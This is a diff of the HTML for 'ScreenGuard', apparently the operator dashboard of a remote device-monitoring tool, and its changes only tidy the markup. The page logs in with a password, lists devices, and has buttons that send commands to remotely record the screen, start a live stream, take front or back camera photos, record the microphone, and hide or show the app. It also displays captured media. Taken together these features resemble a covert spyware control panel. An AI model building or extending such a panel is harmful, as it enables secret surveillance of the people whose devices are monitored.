@@ -9,38 +9,34 @@
 </head>
 <body>
 
-<!-- ========== LOGIN SCREEN ========== -->
+<!-- LOGIN SCREEN -->
 <div id="loginScreen" class="screen">
     <div class="login-box">
         <div class="login-logo">🛡️</div>
         <h1>ScreenGuard</h1>
         <p class="subtitle">Sign in to continue</p>
-
         <form id="loginForm">
-            <input type="password" id="passwordInput" placeholder="Enter password" autocomplete="current-password" required>
+            <input type="password" id="passwordInput" placeholder="Enter password" required>
             <button type="submit" id="loginBtn">Sign In</button>
         </form>
         <p id="loginError" class="error"></p>
     </div>
 </div>
 
-<!-- ========== DASHBOARD ========== -->
+<!-- DASHBOARD -->
 <div id="dashboard" class="screen hidden">
-
     <header class="app-header">
         <div class="header-left">
             <span class="logo">🛡️</span>
             <span class="app-name">ScreenGuard</span>
         </div>
         <div class="header-right">
-            <button id="refreshBtn" class="icon-btn" title="Refresh">🔄</button>
-            <button id="logoutBtn" class="icon-btn" title="Logout">🚪</button>
+            <button id="refreshBtn" class="icon-btn">🔄</button>
+            <button id="logoutBtn" class="icon-btn">🚪</button>
         </div>
     </header>
 
     <main class="app-main">
-
-        <!-- Devices -->
         <section class="section">
             <h2 class="section-title">📱 Devices</h2>
             <div id="devicesList" class="devices-grid">
@@ -48,76 +44,39 @@
             </div>
         </section>
 
-        <!-- Selected Device Actions -->
         <section id="actionsSection" class="section hidden">
             <h2 class="section-title">
                 <span id="selectedName">Device</span>
                 <span id="selectedStatus" class="status-badge">—</span>
             </h2>
 
-            <div class="device-info-row" id="deviceInfo">
+            <div class="device-info-row">
                 <span>🔋 <span id="batteryText">—</span></span>
                 <span>⏰ <span id="lastSeenText">—</span></span>
             </div>
 
-            <!-- Quick Actions -->
             <h3 class="sub-title">🎮 Quick Actions</h3>
             <div class="actions-grid">
-                <button class="action-btn" data-cmd="SCREEN_RECORD:30">
-                    <span class="icon">📹</span>
-                    <span>Record 30s</span>
-                </button>
-                <button class="action-btn" data-cmd="SCREEN_RECORD:60">
-                    <span class="icon">📹</span>
-                    <span>Record 60s</span>
-                </button>
-                <button class="action-btn" data-cmd="LIVE_START">
-                    <span class="icon">📺</span>
-                    <span>Live Start</span>
-                </button>
-                <button class="action-btn danger" data-cmd="LIVE_STOP">
-                    <span class="icon">⏹️</span>
-                    <span>Live Stop</span>
-                </button>
-                <button class="action-btn" data-cmd="CAM_FRONT">
-                    <span class="icon">📸</span>
-                    <span>Front Cam</span>
-                </button>
-                <button class="action-btn" data-cmd="CAM_BACK">
-                    <span class="icon">📷</span>
-                    <span>Back Cam</span>
-                </button>
-                <button class="action-btn" data-cmd="MIC_RECORD:60">
-                    <span class="icon">🎤</span>
-                    <span>Mic 60s</span>
-                </button>
-                <button class="action-btn" data-cmd="MIC_STOP">
-                    <span class="icon">🔇</span>
-                    <span>Mic Stop</span>
-                </button>
-                <button class="action-btn" data-cmd="PING">
-                    <span class="icon">🏓</span>
-                    <span>Ping</span>
-                </button>
-                <button class="action-btn" data-cmd="HIDE">
-                    <span class="icon">🙈</span>
-                    <span>Hide</span>
-                </button>
-                <button class="action-btn" data-cmd="SHOW">
-                    <span class="icon">👁️</span>
-                    <span>Show</span>
-                </button>
+                <button class="action-btn" data-cmd="SCREEN_RECORD:30"><span class="icon">📹</span><span>Record 30s</span></button>
+                <button class="action-btn" data-cmd="SCREEN_RECORD:60"><span class="icon">📹</span><span>Record 60s</span></button>
+                <button class="action-btn" data-cmd="LIVE_START"><span class="icon">📺</span><span>Live Start</span></button>
+                <button class="action-btn danger" data-cmd="LIVE_STOP"><span class="icon">⏹️</span><span>Live Stop</span></button>
+                <button class="action-btn" data-cmd="CAM_FRONT"><span class="icon">📸</span><span>Front Cam</span></button>
+                <button class="action-btn" data-cmd="CAM_BACK"><span class="icon">📷</span><span>Back Cam</span></button>
+                <button class="action-btn" data-cmd="MIC_RECORD:60"><span class="icon">🎤</span><span>Mic 60s</span></button>
+                <button class="action-btn" data-cmd="MIC_STOP"><span class="icon">🔇</span><span>Mic Stop</span></button>
+                <button class="action-btn" data-cmd="PING"><span class="icon">🏓</span><span>Ping</span></button>
+                <button class="action-btn" data-cmd="HIDE"><span class="icon">🙈</span><span>Hide</span></button>
+                <button class="action-btn" data-cmd="SHOW"><span class="icon">👁️</span><span>Show</span></button>
             </div>
 
-            <!-- Custom Duration -->
             <h3 class="sub-title">⏱️ Custom Duration</h3>
             <div class="custom-row">
-                <input type="number" id="customDuration" value="30" min="5" max="600" placeholder="Seconds">
+                <input type="number" id="customDuration" value="30" min="5" max="600">
                 <button class="small-btn" onclick="sendCustom('SCREEN_RECORD')">📹 Screen</button>
                 <button class="small-btn" onclick="sendCustom('MIC_RECORD')">🎤 Mic</button>
             </div>
 
-            <!-- Recent Media -->
             <h3 class="sub-title">
                 🖼️ Recent Media
                 <button class="small-btn" id="refreshMediaBtn">🔄</button>
@@ -125,21 +84,14 @@
             <div id="mediaList" class="media-grid">
                 <div class="loading">Loading media…</div>
             </div>
-
         </section>
-
     </main>
-
 </div>
 
-<!-- Toast -->
 <div id="toast" class="toast hidden"></div>
 
-<!-- Supabase SDK -->
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-
-<!-- App Script -->
 <script src="app.js"></script>
 
 </body>
-  </html>
+</html>
